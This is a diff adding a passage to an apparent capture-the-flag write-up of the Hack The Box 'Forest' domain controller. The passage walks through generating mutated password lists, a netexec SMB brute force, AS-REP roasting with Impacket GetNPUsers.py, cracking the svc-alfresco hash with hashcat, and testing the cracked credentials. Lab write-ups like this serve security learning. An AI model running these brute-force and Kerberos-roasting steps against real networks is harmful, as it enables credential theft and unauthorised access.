@@ -226,3 +226,73 @@ Winter
 Fall
 Summer
 ```
+Another common password is when a word is appended by a recent year, so we can try adding the year the box was created, as well as a year after that.
+
+We can use a bash command to append 2019 and 2020 to the current password list, with 2019 as the box's release date:
+```
+for i in $(cat passlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > pwlist.txt
+```
+After, we can also add an exclamation point:
+```
+for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > t
+cat t > pwlist.txt
+```
+Then we can choose some hashcat rules. According to Ippsec, we should try the best64 rule which does standard password list modifications like converting to l33t, reversing passwords, changing the case, etc. We can also append another rule called toggles1 that toggles various uppercases in the passwords. We can also limit the password length to at least 7 characters, which matches the minimum password length that we got from the domain controller LDAP bind. The overall command:
+```
+hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 6' > pwlist2.txt
+```
+We use sort -u to remove any duplicate passwords from the double rule as well as pipe it to a text file.
+
+We then run netexec for the brute force attempt:
+```
+netexec smb 10.10.10.161 -u users.list -p pwlist2.txt
+```
+which will run for a good while. 
+
+While we wait, we can browse the Impacket folder to see if we can use any tools against the domain controller.
+```
+cd /usr/share/doc/python3-impacket/examples
+ls
+```
+We can try running GetNPUsers.py, which tries to find any domain users who do not have Kerberos preauthentication enabled which would allow us to access their TGT/hashed password which we can attempt to crack with hashcat. 
+
+```
+kchen@kchenVM:/usr/share/doc/python3-impacket/examples$ GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-04-10 21:08:19.513412  2025-04-10 15:59:43.457041  0x410200 
+
+/home/kchen/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:d4b23f646f1c4784603c1f292cf10eff$060acc10e5e9a9a85fde677310206a4b0f378a605cb565c4879ec75d684e66636018da06d07ffa648088410d3abf2721d8981b867abd0c4006699acb67ac33f2dfb97d7a9d5524d9c317e99cb36a3c9c1e6f1397a9d4007c11a59171b437bba2407f588e310dcdeb98e35997e60e4487199b15678286819d3762480e584e9e4fe7038cc5655b941d0e87cb9c2924f75424392fe711799c237a37ad6a7eb83282ec0ed913424409402d43b007cf1ca54b17205f7157e575220b7bf1b4dae1ad5d47ff032640b74ae2cf47655f39ecc7ae41646b490c0641c5d1e9b82a6dee5a141379b8f56415
+```
+
+We then run hashcat with Kerberos ASREP method:
+```
+sudo hashcat -m 18200 hash.txt rockyou.txt
+```
+and we luckily get a cracked password:
+```
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:d4b23f646f1c4784603c1f292cf10eff$060acc10e5e9a9a85fde677310206a4b0f378a605cb565c4879ec75d684e66636018da06d07ffa648088410d3abf2721d8981b867abd0c4006699acb67ac33f2dfb97d7a9d5524d9c317e99cb36a3c9c1e6f1397a9d4007c11a59171b437bba2407f588e310dcdeb98e35997e60e4487199b15678286819d3762480e584e9e4fe7038cc5655b941d0e87cb9c2924f75424392fe711799c237a37ad6a7eb83282ec0ed913424409402d43b007cf1ca54b17205f7157e575220b7bf1b4dae1ad5d47ff032640b74ae2cf47655f39ecc7ae41646b490c0641c5d1e9b82a6dee5a141379b8f56415:s3rvice
+```
+s3rvice
+
+Now that we have their domain password, we can try connecting to smb with netexec:
+```
+netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice 
+```
+
+```
+netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+
+SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+```
+Netexec gave us a plus symbol but no "pwned" sign, meaning that we cannot login with these credentials. We may be able to enumerate shares though.
+
+```
+netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+```
+
